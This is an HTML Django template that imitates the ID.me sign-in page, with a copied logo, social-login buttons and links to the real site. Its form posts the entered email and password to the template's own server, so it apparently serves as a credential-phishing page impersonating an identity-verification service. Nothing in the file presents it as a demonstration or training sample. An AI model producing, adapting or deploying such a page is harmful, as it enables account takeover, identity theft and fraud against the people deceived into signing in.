<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>id.me</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://kit.fontawesome.com/f3b99b4317.js" crossorigin="anonymous"></script>
</head>
<body>
    <style>
    
        .hr-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
        }

        .hr-container hr {
            flex-grow: 1;
            border: none;
            height: 1px;
            background-color: #000;
            margin: 0 10px;
        }
        .container-border {
            
            border-radius: 10px;
            padding-bottom: 20px;
            
        }

        /* Show border on larger screens, hide on smaller screens */
        @media (max-width: 767.98px) {
            .container-border {
                border-left: none;
                border-right: none;
            }
        }
    </style>
</head>
<body class="bg-light">

    <section class="container-fluid">
        <br>
        <div class="text-center">
            <img src="https://i.ibb.co/N2dYt5D/id-me.png" alt="" width="83px">
        </div>
    </section>
    <br>

    <section class="" style="background-image: linear-gradient(#F5F5F5, white);">
        <div  class="container container-border">
            <div class="row justify-content-center">
                <div class="col-lg-6 col-md-8 col-sm-10">


                    <form method="post"   class="p-5 shadow bg-white  rounded">
                        {% csrf_token %}
                        <h3 class="text-center">Sign in to ID.me</h3>
                        <div style="background-color: #F2FAFF;" class="p-3 text-center">
                            <span>New to ID.me?</span>
                            <br>
                            <a href="https://api.id.me/en/registration/new">
                                <span>Create an ID.me account</span>
                            </a>
                        </div>
                        
                        <div class="mb-3">
                            <label for="email" class="form-label">Email</label>
                            <input style="height: 60px; border-color: grey; border-width: 2px; border-style: solid; padding: 10px;" type="text" class="form-control" id="email" name="email" placeholder="Enter your email address" required>
                        </div>
                    
                        <div id="password" class="mb-3" style="position: relative;">
                            <label for="password" class="form-label">Password</label>
                            <input style="height: 60px; border-color: grey; border-width: 2px; border-style: solid; padding: 10px; padding-right: 40px;" type="password" class="form-control" id="passwordField" name="password" placeholder="Enter your password" required>
                            <span id="togglePassword" style="position: absolute; top: 50%; right: 10px; transform: translateY(-50%); cursor: pointer;">
                                <i style="margin-top: 35px;font-size: 20px;margin-right: 10px;" class="fa-solid fa-eye"></i>
                            </span>
                        </div>

                        <div>
                            <input type="checkbox" name="" id=""><span style="margin-left: 20px;">Remember me</span>
                            <br>
                            <span style="margin-left: 33px;">For your security, select only on your devices.</span>
                        </div>
                        <br>
                        <div class="text-center">
                             <button class="btn btn" type="submit"  style="display: block; width: 100%; height: 50px; text-align: center; background-color: #007bff; color: #fff; text-decoration: none; line-height: 10px;">
                                Sign in
                            </button>
                            
                        </div>

                        <div class="text-center">
                            <br>
                            <a href="https://api.id.me/en/passwords/new"><span>Forgot password</span></a>
                        </div>

                        <div class="hr-container">
                            <hr> <span>OR</span><hr>
                        </div>

                        <!--icon buttons-->
                        <div style="display: flex; justify-content: space-around;" class="text-center ">
                            
                                
                            <a style="width: 50px; height: 50px; border: 1px solid gray; display: inline-block;padding: 10px;border-radius: 6px;" href="https://api.id.me/en/broker/facebook/connect?type=signin">   
                                <img src="https://cdn.iconscout.com/icon/free/png-256/free-logo-1889517-1597577.png" alt="" width="30px">
                            </a>
                            
                            


                            <a style="width: 50px; height: 50px; border: 1px solid gray; display: inline-block;padding: 10px;border-radius: 6px;" href="https://api.id.me/en/broker/google/connect?type=signin">
                                    <img src="https://cerai.iitm.ac.in/images/Google_Logo.png" alt="" width="20px">
                            </a>

                            <a style="width: 50px; height: 50px; border: 1px solid gray; display: inline-block;padding: 10px;border-radius: 6px;" href="https://api.id.me/en/broker/apple/connect?type=signin">
                                    <img src="https://cdn3.iconfinder.com/data/icons/picons-social/57/16-apple-512.png" alt="" width="27px">
                                
                            </a>

                            <a style="width: 50px; height: 50px; border: 1px solid gray; display: inline-block;padding: 10px;border-radius: 6px;" href="https://api.id.me/en/broker/linkedin/connect?type=signin">
                                    <img src="https://olc-wordpress-assets.s3.amazonaws.com/uploads/2020/05/linkedin-icon.png" alt="" width="25px">
                                
                            </a>
                        </div>
                        <br>
                        
                          <button class="btn btn" style=" width: 100%; text-align: center; text-decoration: none; line-height: 20px; height: 50px; border-color: gray;">
                            <a href="https://api.id.me/en/session/options" style="text-decoration: none;">View more options</a>
                        </button>  
                    
                        
                    </form>
                    <br>
                
                    <div  class="">
                        <center>
                        <a style="margin-right: 10px;" href="https://www.id.me/about">what is iD.me?</a>|
                        <a href="https://www.id.me/terms">Terms of service</a> |
                        <a style="margin-left: 10px;" href="https://www.id.me/privacy">Privacy policy</a> 
                        </center>
                       
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script>
        var passwordField = document.getElementById("passwordField");
        var togglePassword = document.getElementById("togglePassword");
    
        togglePassword.addEventListener("click", function () {
            if (passwordField.type === "password") {
                passwordField.type = "text";
            } else {
                passwordField.type = "password";
            }
        });
    </script>

</body>
</html>
